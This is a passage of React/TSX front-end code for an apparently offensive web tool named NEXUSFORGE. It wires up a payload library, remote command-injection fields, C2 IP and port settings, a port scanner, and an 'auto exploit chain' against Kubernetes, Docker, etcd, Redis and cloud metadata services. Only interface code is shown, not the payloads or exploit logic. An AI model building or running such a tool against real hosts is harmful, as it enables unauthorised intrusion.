              onClick={()=>{setCmd(sub(item.p));setTab("TERMINAL");}}>
              {libSearch.trim()&&<span className="text-[8px] text-zinc-700 border border-zinc-800 px-1 uppercase shrink-0">{item.cat}</span>}
              <span className={`text-[10px] font-mono flex-1 truncate ${item.col}`} title={sub(item.p)}>{sub(item.p)}</span>
              <div className="flex gap-1 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">
                <button onClick={e=>{e.stopPropagation();copy(sub(item.p),`lib${i}`);}}
                  className={`text-[9px] uppercase ${copyId===`lib${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>
                  {copyId===`lib${i}`?"OK":"CPY"}
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
      <div className="text-[9px] text-zinc-700 shrink-0">
        {libSearch.trim()?`${libFiltered.length} results across all categories`:`${libFiltered.length} payloads in ${libEntry.cat}`} — click to inject
      </div>

      <div className="shrink-0 border border-red-900/40 bg-black p-2 mt-1">
        <div className="flex items-center justify-between mb-2">
          <span className="text-[10px] text-red-500 uppercase tracking-wider">Auto Exploit Chain</span>
          <span className="text-[9px] text-zinc-600">K8s · Docker · etcd · Redis · Cloud Meta</span>
        </div>
        <div className="flex gap-1.5 mb-2">
          <input
            value={chainTarget||target}
            onChange={e=>setChainTarget(e.target.value)}
            placeholder="Target IP (192.168.1.1)"
            className="flex-1 bg-zinc-950 border border-zinc-800 px-2 py-1 text-[11px] text-red-300 font-mono focus:outline-none focus:border-red-600 placeholder-zinc-700"
          />
          <button
            onClick={handleExploitChain}
            disabled={chainRunning}
            className="px-3 py-1 bg-red-900 text-white text-[11px] uppercase font-bold hover:bg-red-800 disabled:opacity-40 transition-colors whitespace-nowrap"
          >
            {chainRunning ? (
              <span className="flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-ping inline-block"/>
                RUNNING
              </span>
            ) : "CHAIN EXPLOIT"}
          </button>
        </div>
        {chainSteps.length > 0 && (
          <div className="border border-zinc-900 bg-zinc-950 max-h-48 overflow-y-auto">
            {chainSteps.map((step, i) => (
              <div key={i} className={`border-b border-zinc-900 px-2 py-1.5 ${step.status==="success"?"bg-green-950/10":step.status==="skipped"?"bg-zinc-900/30":"bg-zinc-950"}`}>
                <div className="flex items-center gap-2 mb-0.5">
                  <span className={`text-[8px] font-bold w-4 ${step.status==="success"?"text-green-400":step.status==="skipped"?"text-yellow-500":"text-red-500"}`}>
                    {step.status==="success"?"✓":step.status==="skipped"?"?":"✗"}
                  </span>
                  <span className="text-[9px] text-zinc-500 border border-zinc-800 px-1 uppercase shrink-0">{step.service}</span>
                  {step.port > 0 && <span className="text-[9px] text-zinc-700">:{step.port}</span>}
                  <span className={`text-[10px] font-mono flex-1 truncate ${step.status==="success"?"text-green-300":step.status==="skipped"?"text-yellow-600":"text-zinc-500"}`}>{step.action}</span>
                  <span className="text-[8px] text-zinc-700 shrink-0">{step.elapsed}ms</span>
                </div>
                {step.status==="success" && step.result && (
                  <pre className="text-[9px] text-lime-400 font-mono whitespace-pre-wrap break-words ml-6 max-h-20 overflow-y-auto bg-black border border-zinc-900 px-1.5 py-1 mt-0.5">{step.result.slice(0, 600)}</pre>
                )}
              </div>
            ))}
          </div>
        )}
        {chainDone && chainSteps.length === 0 && (
          <div className="text-[10px] text-zinc-600 text-center py-2">No open services found on target.</div>
        )}
      </div>
    </div>
  );

  // ── SCANNER ───────────────────────────────────────────
  const tabScanner = () => (
    <div className="flex-1 flex flex-col p-3 gap-3 overflow-y-auto">
      <div className="grid grid-cols-1 gap-2">
        <div>
          <div className="text-[10px] text-zinc-600 uppercase mb-1">Target Host / IP</div>
          <input value={scanTarget||target} onChange={e=>setScanTarget(e.target.value)}
            className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-sm text-red-300 font-mono focus:outline-none focus:border-red-700"
            placeholder="192.168.1.1 or hostname"/>
        </div>
        <div className="grid grid-cols-2 gap-2">
          <div>
            <div className="text-[10px] text-zinc-600 uppercase mb-1">Port Preset</div>
            <select value={scanPreset} onChange={e=>setScanPreset(e.target.value)}
              className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700">
              {[...Object.keys(SCAN_PRESETS),"CUSTOM"].map(k=><option key={k} value={k}>{k}{SCAN_PRESETS[k]?` (${SCAN_PRESETS[k]?.length})`:""}</option>)}
            </select>
          </div>
          <div>
            <div className="text-[10px] text-zinc-600 uppercase mb-1">Timeout (ms)</div>
            <select value={scanTimeout} onChange={e=>setScanTimeout(Number(e.target.value))}
              className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700">
              <option value={600}>600ms fast</option>
              <option value={1200}>1200ms normal</option>
              <option value={2500}>2500ms slow</option>
              <option value={4000}>4000ms thorough</option>
            </select>
          </div>
        </div>
        {scanPreset==="CUSTOM"&&(
          <div>
            <div className="text-[10px] text-zinc-600 uppercase mb-1">Custom Ports (comma or space separated)</div>
            <input value={scanCustom} onChange={e=>setScanCustom(e.target.value)}
              className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-sm text-cyan-400 font-mono focus:outline-none focus:border-red-700"
              placeholder="80, 443, 8080, 3306, 5432, 22"/>
          </div>
        )}
      </div>

      {/* Controls row */}
      <div className="flex items-center gap-2 shrink-0 flex-wrap">
        <button
          onClick={scanning ? handleAbortScan : handleScan}
          disabled={!scanning && !(scanTarget||target).trim()}
          className={`px-5 py-2 text-xs uppercase font-bold transition-colors disabled:opacity-40 ${
            scanning
              ? "bg-zinc-900 border border-red-700 text-red-400 hover:bg-red-950/40"
              : "bg-red-900 text-white hover:bg-red-800"
          }`}
        >
          {scanning ? "■ ABORT" : "SCAN"}
        </button>

        {(scanning || scanDone) && (
          <div className="flex items-center gap-3 text-xs flex-1 min-w-0">
            {scanning && (
              <>
                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse shrink-0"/>
                <span className="text-zinc-500 shrink-0">{scanScanned}/{scanTotal}</span>
              </>
            )}
            {scanOpenCount > 0 && (
              <span className="text-green-400 font-bold shrink-0">
                {scanOpenCount} open
              </span>
            )}
            {scanDone && !scanning && (
              <span className="text-zinc-600 shrink-0">
                {scanResults.length} ports · {(scanMs/1000).toFixed(1)}s
              </span>
            )}
          </div>
        )}
      </div>

      {/* Progress bar — visible while scanning */}
      {scanning && scanTotal > 0 && (
        <div className="shrink-0">
          <div className="h-1.5 bg-zinc-900 w-full overflow-hidden">
            <div
              className="h-full bg-red-600 transition-all duration-100"
              style={{ width: `${Math.round((scanScanned / scanTotal) * 100)}%` }}
            />
          </div>
          <div className="flex justify-between mt-0.5 text-[9px] text-zinc-700">
            <span>{Math.round((scanScanned / scanTotal) * 100)}%</span>
            <span>{scanTotal - scanScanned} remaining</span>
          </div>
        </div>
      )}

      {/* Results table — streams in real time */}
      {scanResults.length > 0 && (
        <div className="flex-1 min-h-0 border border-zinc-900 bg-black overflow-auto">
          <table className="w-full text-[10px]">
            <thead className="bg-zinc-900 text-zinc-600 sticky top-0 z-10">
              <tr>
                <th className="px-2 py-1.5 text-left font-normal w-16">STATUS</th>
                <th className="px-2 py-1.5 text-left font-normal w-14">PORT</th>
                <th className="px-2 py-1.5 text-left font-normal w-28">SERVICE</th>
                <th className="px-2 py-1.5 text-left font-normal">BANNER / INFO</th>
                <th className="px-2 py-1.5 font-normal w-12">ACT</th>
              </tr>
            </thead>
            <tbody>
              {/* Open ports — streamed in first, highlighted */}
              {scanResults.filter(r => r.open).map((r, i) => (
                <tr key={`o${r.port}${i}`} className="border-t border-zinc-900 bg-green-950/15 hover:bg-green-950/25 animate-[fadeIn_0.15s_ease]">
                  <td className="px-2 py-1">
                    <span className="text-green-400 font-bold tracking-wider">OPEN</span>
                  </td>
                  <td className="px-2 py-1 text-white font-bold font-mono">{r.port}</td>
                  <td className="px-2 py-1 text-cyan-400">{r.service}</td>
                  <td className="px-2 py-1 text-zinc-400 font-mono max-w-[220px] truncate" title={r.banner}>
                    {r.banner || <span className="text-zinc-700">—</span>}
                  </td>
                  <td className="px-2 py-1 text-center">
                    <button
                      onClick={() => { setCmd(`nc -zv ${(scanTarget||target).trim()} ${r.port}`); setTab("TERMINAL"); }}
                      className="text-[9px] text-zinc-600 hover:text-lime-400 uppercase"
                      title="Send to terminal"
                    >NC</button>
                  </td>
                </tr>
              ))}

              {/* Divider when both open and closed exist */}
              {scanResults.some(r => r.open) && scanResults.some(r => !r.open) && (
                <tr className="border-t border-zinc-800">
                  <td colSpan={5} className="px-2 py-0.5 text-[9px] text-zinc-700 bg-zinc-950">
                    ── closed / filtered ──────────────────────────────────────
                  </td>
                </tr>
              )}

              {/* Closed ports — dimmed */}
              {scanResults.filter(r => !r.open).slice(0, 20).map((r, i) => (
                <tr key={`c${r.port}${i}`} className="border-t border-zinc-900/50 opacity-25 hover:opacity-50 transition-opacity">
                  <td className="px-2 py-0.5 text-zinc-700">CLOSED</td>
                  <td className="px-2 py-0.5 text-zinc-600 font-mono">{r.port}</td>
                  <td className="px-2 py-0.5 text-zinc-700">{r.service}</td>
                  <td className="px-2 py-0.5 text-zinc-800">—</td>
                  <td/>
                </tr>
              ))}
              {scanResults.filter(r => !r.open).length > 20 && (
                <tr className="border-t border-zinc-900">
                  <td colSpan={5} className="px-2 py-1.5 text-zinc-700 text-center text-[9px]">
                    …{scanResults.filter(r => !r.open).length - 20} more closed ports hidden
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      )}

      {/* Empty state */}
      {scanDone && !scanning && scanResults.filter(r => r.open).length === 0 && (
        <div className="border border-zinc-900 bg-black p-6 text-center shrink-0">
          <div className="text-zinc-600 text-sm">No open ports detected</div>
          <div className="text-zinc-700 text-xs mt-1">
            Try a longer timeout or verify the target is reachable
          </div>
        </div>
      )}
    </div>
  );

  // ─── MAIN RENDER ──────────────────────────────────────
  return (
    <div className="min-h-screen bg-black text-zinc-300 font-mono flex flex-col select-none">

      {/* Header */}
      <header className="flex items-center justify-between px-4 py-2 border-b border-red-900/50 bg-zinc-950 shrink-0 flex-wrap gap-2">
        <div className="flex items-center gap-3 flex-wrap text-xs">
          <span className="text-red-500 font-bold tracking-widest text-sm">NEXUSFORGE</span>
          <span className="text-zinc-700">v9.0</span>
          <span className="text-zinc-700">|</span>
          <span className={`w-2 h-2 rounded-full inline-block ${hubStatus?.status==="online"?"bg-green-500":"bg-zinc-600"}`}/>
          <span className="text-zinc-500 uppercase">{hubStatus?.status??"connecting"}</span>
          <span className="text-zinc-700">|</span>
          <span className="text-zinc-600">{ENGINE_OPTIONS.length} engines</span>
          <span className="text-zinc-700">·</span>
          <span className="text-zinc-600">{MODES.length} modes</span>
          {target&&<><span className="text-zinc-700">|</span><span className="text-red-400">TGT: {target}</span></>}
          {injectionUrl.trim()&&<><span className="text-zinc-700">|</span><span className="text-amber-400 truncate max-w-[160px]">URL: {injectionUrl.trim()}</span></>}
          {attIp&&<><span className="text-zinc-700">|</span><span className="text-purple-400">C2: {attIp}:{attPort}</span></>}
        </div>
        <div className="flex items-center gap-2 text-xs">
          {running&&(
            <button onClick={()=>{wsRef.current?.close();setRunning(false);setOutput(p=>p+"[KILLED]\n\n");}}
              className="px-3 py-1 border border-red-700 text-red-500 hover:bg-red-950/40 uppercase">KILL</button>
          )}
          <span className="border border-red-900 px-3 py-1 text-red-400 font-bold">{String(score).padStart(6,"0")}</span>
        </div>
      </header>

      <div className="flex-1 flex flex-col md:flex-row overflow-hidden min-h-0">

        {/* Sidebar */}
        <aside className="w-full md:w-60 border-r border-red-900/30 bg-zinc-950 flex flex-col overflow-y-auto shrink-0">
          <div className="p-3 space-y-3">

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">Engine</div>
              <select value={engine} onChange={e=>setEngine(e.target.value)}
                className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700">
                {ENGINE_OPTIONS.map(o=>{
                  const lang = o.value.split("/")[0] as string;
                  const ok   = engines ? (engines as unknown as Record<string,boolean>)[lang] !== false : true;
                  return <option key={o.value} value={o.value}>{o.label}{!ok?" [N/A]":""}</option>;
                })}
              </select>
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">Mode</div>
              <div className="grid grid-cols-2 gap-0.5">
                {MODES.map(m=>(
                  <button key={m} onClick={()=>setMode(m)}
                    className={`py-0.5 text-[9px] uppercase border transition-colors flex flex-col items-center ${mode===m?`border-red-600 ${MODE_COLOR[m]} bg-red-950/20`:"border-zinc-800 text-zinc-700 hover:border-zinc-600"}`}>
                    <span>{m}</span>
                    <span className={`text-[8px] ${mode===m?"opacity-70":"opacity-40"}`}>{MODE_DESC[m]}</span>
                  </button>
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-1.5">
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Target</div>
                <input type="text" value={target} onChange={e=>setTarget(e.target.value)} placeholder="192.168.1.1"
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-red-300 placeholder-zinc-700 focus:outline-none focus:border-red-700" autoComplete="off"/>
              </div>
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">C2 IP</div>
                <input type="text" value={attIp} onChange={e=>setAttIp(e.target.value)} placeholder="10.10.14.1"
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-800" autoComplete="off"/>
              </div>
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">C2 Port</div>
              <input type="text" value={attPort} onChange={e=>setAttPort(e.target.value)} placeholder="4444"
                className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-purple-300 placeholder-zinc-700 focus:outline-none focus:border-purple-800" autoComplete="off"/>
            </div>

            <div className="border border-red-900/30 bg-zinc-900/30 p-2 space-y-1.5">
              <div className="text-[10px] text-red-500 uppercase tracking-wider mb-0.5">Remote Injection Target</div>
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Injection URL</div>
                <input
                  type="text"
                  value={injectionUrl}
                  onChange={e=>setInjectionUrl(e.target.value)}
                  placeholder="http://target.com/vuln.php"
                  className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-amber-300 placeholder-zinc-700 focus:outline-none focus:border-amber-700 font-mono"
                  autoComplete="off"
                  spellCheck={false}
                />
              </div>
              <div className="grid grid-cols-2 gap-1.5">
                <div>
                  <div className="text-[10px] text-zinc-600 uppercase mb-1">Param</div>
                  <input
                    type="text"
                    value={injectParam}
                    onChange={e=>setInjectParam(e.target.value)}
                    placeholder="cmd"
                    className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-amber-300 placeholder-zinc-700 focus:outline-none focus:border-amber-700 font-mono"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <div className="text-[10px] text-zinc-600 uppercase mb-1">Method</div>
                  <select
                    value={httpMethod}
                    onChange={e=>setHttpMethod(e.target.value)}
                    className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-amber-300 focus:outline-none focus:border-amber-700"
                  >
                    {["GET","POST","PUT","PATCH","DELETE","JSON","COOKIE","HEADER","PATH","XML","MULTIPART"].map(m=>(
                      <option key={m} value={m}>{m}</option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">Custom Headers <span className="text-zinc-700">(one per line)</span></div>
                <textarea
                  value={customHeaders}
                  onChange={e=>setCustomHeaders(e.target.value)}
                  placeholder={"X-Forwarded-For: 127.0.0.1\nAuthorization: Bearer token"}
                  className="w-full h-14 bg-black border border-zinc-800 px-2 py-1 text-[10px] text-amber-300 placeholder-zinc-700 focus:outline-none focus:border-amber-700 resize-none font-mono"
                  spellCheck={false}
                />
              </div>
              {injectionUrl.trim() && (
                <button
                  onClick={handleProbe}
                  disabled={probing}
                  className="w-full py-1 text-[9px] uppercase border border-purple-800 text-purple-400 hover:bg-purple-950/30 disabled:opacity-40 transition-colors font-bold tracking-widest"
                >
                  {probing ? "PROBING..." : "PROBE ENVIRONMENT"}
                </button>
              )}
              {probeResult && (
                <div className="bg-zinc-950 border border-purple-900/40 p-1.5 mt-1">
                  <div className="text-[9px] text-purple-500 uppercase mb-1">Probe Result</div>
                  <pre className="text-[9px] text-purple-300 font-mono whitespace-pre-wrap break-all leading-relaxed max-h-48 overflow-y-auto">
                    {probeResult}
                  </pre>
                </div>
              )}
              {injectionUrl.trim() && (
                <div className="text-[9px] text-amber-500/80 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-500 inline-block animate-pulse"/>
                  Remote mode active — inject fires HTTP {httpMethod} to target
                </div>
              )}
            </div>

            <div>
              <div className="text-[10px] text-zinc-600 uppercase mb-1">
                Payload <span className={`ml-1 ${MODE_COLOR[mode]??""}`}>[ {mode} ]</span>
              </div>
              <textarea value={cmd} onChange={e=>setCmd(e.target.value)}
                onKeyDown={e=>{
                  if (e.key==="Enter"&&!e.shiftKey){e.preventDefault();handleInject();}
                  if (e.key==="ArrowUp"&&!e.shiftKey){e.preventDefault();histNav("up");}
                  if (e.key==="ArrowDown"&&!e.shiftKey){e.preventDefault();histNav("down");}
                }}
                className="w-full h-24 bg-black border border-red-900/60 px-2 py-1.5 text-lime-400 font-mono text-[11px] focus:outline-none focus:border-red-500 resize-none"
                placeholder="↑↓ history · Enter inject · Shift+Enter newline" spellCheck={false} autoComplete="off"/>
              <div className="flex gap-1.5 mt-1">
                <button onClick={handleInject} disabled={running||!cmd.trim()}
                  className="flex-1 bg-red-900 text-white font-bold py-1.5 text-xs uppercase hover:bg-red-800 disabled:opacity-40 transition-colors">
                  {running?"STREAMING…":"INJECT"}
                </button>
                <button onClick={()=>fetchSuggestions()} title="Payload suggestions"
                  className="px-2.5 bg-zinc-900 border border-zinc-800 text-zinc-500 text-[10px] uppercase hover:bg-zinc-800">SUGGEST</button>
              </div>
            </div>

            {history.length>0&&(
              <div>
                <div className="text-[10px] text-zinc-600 uppercase mb-1">History ({history.length})</div>
                <div className="space-y-0.5 max-h-20 overflow-y-auto">
                  {history.slice(0,6).map((h,i)=>(
                    <div key={i} onClick={()=>setCmd(h)}
                      className="text-[9px] text-zinc-500 font-mono truncate px-1.5 py-0.5 hover:bg-zinc-900 cursor-pointer border border-transparent hover:border-zinc-800">
                      {h}
                    </div>
                  ))}
                </div>
              </div>
            )}

          </div>
        </aside>

        {/* Main area */}
        <main className="flex-1 flex flex-col min-w-0 min-h-0">

          {/* Tabs */}
          <div className="flex items-center border-b border-zinc-900 bg-zinc-950 shrink-0 overflow-x-auto">
            {TABS.map((t,i)=>(
              <button key={t} onClick={()=>setTab(t)}
                className={`px-3 py-2 text-[10px] uppercase tracking-wider border-r border-zinc-900 whitespace-nowrap transition-colors flex items-center gap-1 ${tab===t?"bg-black text-red-400 border-b border-red-600":"text-zinc-600 hover:text-zinc-400 hover:bg-black/30"}`}>
                {t}
                {t==="SCANNER"&&scanDone&&openPorts.length>0&&<span className="text-[8px] text-green-400 font-bold">{openPorts.length}</span>}
                <span className="text-[8px] text-zinc-700 ml-0.5">F{i+1}</span>
              </button>
            ))}
            <div className="ml-auto px-3 text-[9px] text-zinc-700 hidden md:block whitespace-nowrap">Ctrl+Enter inject</div>
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            {tab==="TERMINAL"&&tabTerminal()}
            {tab==="FUZZER"  &&tabFuzzer()}
            {tab==="ENCODER" &&tabEncoder()}
            {tab==="SHELLS"  &&tabShells()}
            {tab==="LIBRARY" &&tabLibrary()}
            {tab==="SCANNER" &&tabScanner()}
            {tab==="OOB"          &&<OobPanel />}
            {tab==="AUTOCHAIN"    &&<AutoExploitPanel />}
            {tab==="REPLAYS"      &&<ChainReplayPanel />}
        {tab==="CVE"           &&<CvePanel />}
          </div>

          {/* Bottom panel */}
          <div className="h-44 bg-zinc-950 border-t border-red-900/30 flex gap-3 p-3 shrink-0 overflow-hidden">
            <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
              <div className="flex justify-between items-center mb-1 shrink-0">
                <span className="text-[10px] text-red-500 uppercase">Injection Log</span>
                <button onClick={()=>clearLogs.mutate()} className="text-[10px] text-zinc-700 hover:text-red-400 uppercase">CLEAR</button>
              </div>
              <div className="flex-1 overflow-y-auto border border-zinc-900 bg-black min-h-0">
                <table className="w-full text-[10px]">
                  <thead className="bg-zinc-900 text-zinc-600 sticky top-0">
                    <tr>
                      <th className="px-2 py-0.5 text-left font-normal">TIME</th>
                      <th className="px-2 py-0.5 text-left font-normal">MODE</th>
                      <th className="px-2 py-0.5 text-left font-normal">ENGINE</th>
                      <th className="px-2 py-0.5 text-left font-normal">COMMAND</th>
                      <th className="px-2 py-0.5 text-left font-normal">MS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs?.map((l)=>(
                      <tr key={l.id} className="border-t border-zinc-900 hover:bg-zinc-900/30">
                        <td className="px-2 py-0.5 text-zinc-600">{new Date(l.timestamp).toLocaleTimeString()}</td>
                        <td className="px-2 py-0.5"><span className={`uppercase ${MODE_COLOR[l.mode]??"text-zinc-400"}`}>{l.mode}</span></td>
                        <td className="px-2 py-0.5 text-zinc-500 truncate max-w-[80px]">{l.engine}</td>
                        <td className="px-2 py-0.5 text-zinc-300 truncate max-w-[160px]" title={l.command}>{l.command}</td>
                        <td className="px-2 py-0.5 text-zinc-600">{l.responseTime}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
            <div className="w-36 flex flex-col border border-zinc-900 bg-black p-2 shrink-0">
              <span className="text-[10px] text-red-500 uppercase mb-1.5">Analytics</span>
              <div className="space-y-0.5 text-[10px] overflow-y-auto">
                <div className="flex justify-between"><span className="text-zinc-600">TOTAL</span><span className="text-zinc-300">{stats.total}</span></div>
                {(Object.keys(MODE_COLOR) as Mode[]).filter(m=>(stats as Record<string,number>)[m]>0).map(m=>(
                  <div key={m} className="flex justify-between">
                    <span className="text-zinc-600 uppercase">{m}</span>
                    <span className={MODE_COLOR[m]}>{(stats as Record<string,number>)[m]}</span>
                  </div>
                ))}
                <div className="border-t border-zinc-900 pt-1 flex justify-between mt-1">
                  <span className="text-zinc-600">SCORE</span>
                  <span className="text-red-400 font-bold">{score}</span>
                </div>
              </div>
            </div>
          </div>

        </main>
      </div>
    </div>
  );
}
